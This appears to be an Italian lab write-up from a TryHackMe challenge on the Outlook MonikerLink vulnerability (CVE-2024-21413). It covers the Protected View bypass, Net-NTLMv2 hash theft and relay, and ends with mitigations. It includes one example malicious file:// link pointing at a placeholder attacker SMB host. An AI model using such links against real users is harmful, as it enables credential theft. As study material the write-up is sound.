# üõ°Ô∏è Exploitation: Analisi della Vulnerabilit√† Moniker Link

In questa sezione ho analizzato la vulnerabilit√† **CVE-2024-21413**, nota come il bug **MonikerLink** in Microsoft Outlook. Questa vulnerabilit√† dimostra come sia possibile bypassare le protezioni di sicurezza del sistema operativo sfruttando componenti legacy di Windows.

---

## üîç Descrizione del Caso (CVE-2024-21413)
La vulnerabilit√† permette a un attaccante di inviare un'email contenente un link appositamente formattato che, se elaborato da Outlook, scavalca il **Protected View** (Visualizzazione Protetta).

* **Severit√†:** Critica (Punteggio CVSS 9.8)
* **Vettore di attacco:** Remoto, senza necessit√† di privilegi elevati.
* **Componente colpito:** Component Object Model (COM) / OLE.

---

## üõ†Ô∏è Meccanismo Tecnico
L'attacco si basa sulla manipolazione di un **Hyperlink** utilizzando il protocollo `file://`.

### La sintassi del Moniker Link
Un link normale punta a un file; un Moniker Link malevolo usa una sintassi speciale (spesso includendo il simbolo `!`) per istruire Windows ad attivare un oggetto specifico:

`file:///\\10.10.10.10\share\test.docx!payload`

1. **Bypass:** Il sistema interpreta la risorsa come "fidata" o forza l'applicazione a uscire dalla sandbox di sicurezza.
2. **Attivazione COM:** Viene invocato il sistema di oggetti di Windows per gestire il puntatore dopo il punto esclamativo.



---

## üîë Impatto: Furto di Credenziali Net-NTLMv2
L'obiettivo principale di questo attacco √® spesso il furto dell'hash di autenticazione della vittima.

* **Challenge-Response:** Quando Outlook tenta di accedere al link `file://` malevolo, avvia automaticamente l'handshake **Net-NTLMv2**.
* **Esfiltrazione:** Il PC della vittima invia la "risposta" (hash) al server dell'attaccante.
* **Exploitation:** L'attaccante pu√≤ tentare il cracking della password offline o utilizzare l'hash per un attacco di tipo **Relay** nella rete locale.

---

## üõ°Ô∏è Mitigazione e Difesa
Per difendersi da questo tipo di minacce √® fondamentale:
1. **Patch Management:** Installare tempestivamente gli aggiornamenti di sicurezza Microsoft.
2. **Email Filtering:** Bloccare o ispezionare link che utilizzano protocolli sospetti come `file://`.
3. **SMB Signing:** Abilitare la firma SMB per prevenire gli attacchi di Relay.

---
*Note: Note documentate durante la sfida pratica sulla vulnerabilit√† Moniker Link su TryHackMe.*
